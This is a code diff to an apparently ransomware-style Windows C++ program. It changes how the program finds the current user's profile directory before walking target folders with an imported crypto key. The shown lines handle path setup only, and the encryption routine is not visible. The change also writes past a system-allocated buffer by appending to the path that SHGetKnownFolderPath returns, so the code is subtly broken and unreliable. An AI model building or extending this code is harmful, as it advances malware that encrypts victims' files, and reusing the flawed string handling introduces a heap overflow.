@@ -1,7 +1,7 @@
 #include <iostream>
 #include <Windows.h>
 #include "strsafe.h"
-
+#include <ShlObj.h>
 
 
 
@@ -16,20 +16,17 @@ HCRYPTKEY keyimport();
 
 int main() {
 
-	//TODO ; use the getusername func and a bit of string manipulation for the dirs absolute path C:\\[name]\\fakedir\\
+	//TODO ; GUI
 
 	LPCWSTR targetDirs[] = { L"\\fakedir" };
-	WCHAR name[60];
-	DWORD size = sizeof(name) / sizeof(name[0]);
-	GetUserName(name, &size);
-	
+	LPWSTR userDir;
+	SHGetKnownFolderPath(FOLDERID_Profile,0,NULL,&userDir);
 
 	HCRYPTKEY key = keyimport();
 
 	for (LPCWSTR singledir : targetDirs) {
 		
-		WCHAR absoluteDirPath[MAX_PATH] = L"C:\\";
-		StringCchCatW(absoluteDirPath, MAX_PATH, name);
+		WCHAR* absoluteDirPath = userDir;
 		StringCchCatW(absoluteDirPath, MAX_PATH, singledir);
 		traverse(absoluteDirPath,key);
 	}
